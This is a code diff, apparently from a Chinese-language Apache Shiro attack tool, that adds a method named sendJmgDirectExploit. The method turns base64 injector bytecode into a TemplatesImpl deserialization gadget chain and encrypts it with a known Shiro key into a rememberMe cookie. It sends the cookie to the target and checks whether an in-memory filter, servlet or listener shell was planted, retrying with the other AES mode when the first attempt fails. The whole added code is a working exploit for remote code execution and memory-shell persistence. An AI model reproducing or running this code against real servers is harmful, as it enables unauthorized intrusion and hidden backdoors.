@@ -941,6 +941,58 @@ public class AttackService {
         return result;
     }
 
+    /**
+     * jMG 注入：payload 本身是注入器字节码，直接作为 TemplatesImpl translet 发送（和 jEG 相同路径）。
+     * 不需要 InjectMemTool 二次加载。
+     */
+    public String sendJmgDirectExploit(String gadgetOpt, String shiroKey, String base64Payload, TextArea sink) {
+        TextArea logArea = sink != null ? sink : this.mainController.logTextArea;
+        if (base64Payload == null || base64Payload.trim().isEmpty()) {
+            logArea.appendText(Utils.log("[异常] jMG payload 为空"));
+            return null;
+        }
+        try {
+            byte[] classBytes = Base64.decode(base64Payload.trim());
+            Object template = Gadgets.createTemplatesImpl(classBytes);
+            Class<? extends ObjectPayload> gadgetClazz = resolvePayloadClass(gadgetOpt);
+            if (gadgetClazz == null) {
+                logArea.appendText(Utils.log("[异常] 未找到利用链类: " + gadgetOpt));
+                return null;
+            }
+            ObjectPayload<?> gp = gadgetClazz.newInstance();
+            Object chainObject = gp.getObject(template);
+            String rememberMe = shiro.sendpayload(chainObject, this.shiroKeyWord, shiroKey);
+            HashMap<String, String> header = new HashMap<String, String>();
+            header.put("Cookie", rememberMe);
+            String result = this.bodyHttpRequest(header, "");
+            if (result != null && (result.contains("->|Success|<-") || result.contains("Filter already exists") || result.contains("Servlet already exists") || result.contains("Listener already exists"))) {
+                logArea.appendText(Utils.log("[注入结果] 成功 (jMG direct)"));
+            } else if (result != null && result.contains("=deleteMe")) {
+                // 切换 AES 模式重试
+                int altMode = aesGcmCipherType == 0 ? 1 : 0;
+                logArea.appendText(Utils.log("[*] 切换 AES 模式为 " + (altMode == 1 ? "GCM" : "CBC") + " 重试..."));
+                int origMode = aesGcmCipherType;
+                aesGcmCipherType = altMode;
+                rememberMe = shiro.sendpayload(chainObject, this.shiroKeyWord, shiroKey);
+                header.put("Cookie", rememberMe);
+                result = this.bodyHttpRequest(header, "");
+                if (result != null && (result.contains("->|Success|<-") || result.contains("Filter already exists") || result.contains("Servlet already exists") || result.contains("Listener already exists"))) {
+                    logArea.appendText(Utils.log("[注入结果] 成功 (jMG direct)"));
+                } else {
+                    aesGcmCipherType = origMode;
+                    logArea.appendText(Utils.log("[注入结果] 失败"));
+                }
+            } else {
+                logArea.appendText(Utils.log("[注入结果] 未识别响应"));
+            }
+            logArea.appendText(Utils.log("-------------------------------------------------"));
+            return result;
+        } catch (Exception e) {
+            logArea.appendText(Utils.log("[异常] " + (e.getMessage() != null ? e.getMessage() : e.toString())));
+            logArea.appendText(Utils.log("-------------------------------------------------"));
+            return null;
+        }
+    }
     public static boolean looksLikeRememberMeCookiePayload(String raw) {
         if (raw == null) {
             return false;
